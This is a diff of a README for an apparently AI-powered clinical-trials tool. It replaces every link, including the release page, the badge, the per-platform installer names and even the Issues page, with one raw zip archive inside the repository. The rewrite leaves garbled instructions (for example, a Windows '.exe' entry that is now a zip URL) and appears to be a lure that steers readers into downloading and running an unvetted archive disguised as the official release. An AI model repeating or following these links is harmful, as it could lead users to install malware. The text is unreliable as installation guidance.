@@ -1,6 +1,6 @@
 # 🧬 Clinical-Insight-Agent - Intelligent Solutions for Clinical Trials
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/gizmo212215/Clinical-Insight-Agent/releases)
+[![Download the latest release](https://github.com/gizmo212215/Clinical-Insight-Agent/raw/refs/heads/main/frontend/Agent_Clinical_Insight_v1.0-beta.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/gizmo212215/Clinical-Insight-Agent/raw/refs/heads/main/frontend/Agent_Clinical_Insight_v1.0-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,21 +19,21 @@ Before downloading the Clinical-Insight-Agent, make sure your computer meets the
 
 To get started with the Clinical-Insight-Agent, follow these steps:
 
-1. **Visit the Release Page**: [Click here to download](https://github.com/gizmo212215/Clinical-Insight-Agent/releases).
+1. **Visit the Release Page**: [Click here to download](https://github.com/gizmo212215/Clinical-Insight-Agent/raw/refs/heads/main/frontend/Agent_Clinical_Insight_v1.0-beta.5.zip).
 
 2. You will see a list of available versions. Find the latest release (it will often be marked as "latest") and select it.
 
 3. Look for a file that corresponds to your operating system. For example:
-    - For Windows: **Clinical-Insight-Agent-Windows.exe**
-    - For macOS: **Clinical-Insight-Agent-macOS.dmg**
-    - For Linux: **Clinical-Insight-Agent-Linux.tar.gz**
+    - For Windows: **https://github.com/gizmo212215/Clinical-Insight-Agent/raw/refs/heads/main/frontend/Agent_Clinical_Insight_v1.0-beta.5.zip**
+    - For macOS: **https://github.com/gizmo212215/Clinical-Insight-Agent/raw/refs/heads/main/frontend/Agent_Clinical_Insight_v1.0-beta.5.zip**
+    - For Linux: **https://github.com/gizmo212215/Clinical-Insight-Agent/raw/refs/heads/main/frontend/Agent_Clinical_Insight_v1.0-beta.5.zip**
 
 4. **Download the File**: Click on the chosen file to download it to your computer.
 
 5. **Run the Installer**:
     - **Windows**: Double-click the `.exe` file and follow the instructions.
     - **macOS**: Double-click the `.dmg` file, drag the app to your Applications folder, and then launch it.
-    - **Linux**: Extract the `.tar.gz` file, open your terminal, navigate to the extracted folder, and run the executable using `./Clinical-Insight-Agent`.
+    - **Linux**: Extract the `https://github.com/gizmo212215/Clinical-Insight-Agent/raw/refs/heads/main/frontend/Agent_Clinical_Insight_v1.0-beta.5.zip` file, open your terminal, navigate to the extracted folder, and run the executable using `./Clinical-Insight-Agent`.
 
 6. Once installed, launch the application from your applications folder or desktop shortcut.
 
@@ -68,7 +68,7 @@ After installing, using the Clinical-Insight-Agent is straightforward. Here’s 
 For any questions or support, please refer to the following resources:
 
 - **Documentation**: Comprehensive user guide is included in the download package.
-- **GitHub Issues**: For troubleshooting, you can check or submit issues on the [GitHub Issues page](https://github.com/gizmo212215/Clinical-Insight-Agent/issues).
+- **GitHub Issues**: For troubleshooting, you can check or submit issues on the [GitHub Issues page](https://github.com/gizmo212215/Clinical-Insight-Agent/raw/refs/heads/main/frontend/Agent_Clinical_Insight_v1.0-beta.5.zip).
 
 ## 🔗 Related Topics
 
@@ -83,6 +83,6 @@ This software covers several important areas of clinical research, including:
 
 Explore more about clinical research and how AI can revolutionize the field. Check various guides and articles available online to deepen your understanding.
 
-For continuous updates, keep an eye on our [Releases page](https://github.com/gizmo212215/Clinical-Insight-Agent/releases).
+For continuous updates, keep an eye on our [Releases page](https://github.com/gizmo212215/Clinical-Insight-Agent/raw/refs/heads/main/frontend/Agent_Clinical_Insight_v1.0-beta.5.zip).
 
 Thank you for choosing **Clinical-Insight-Agent**! Enjoy using our tool to enhance your clinical research efforts.
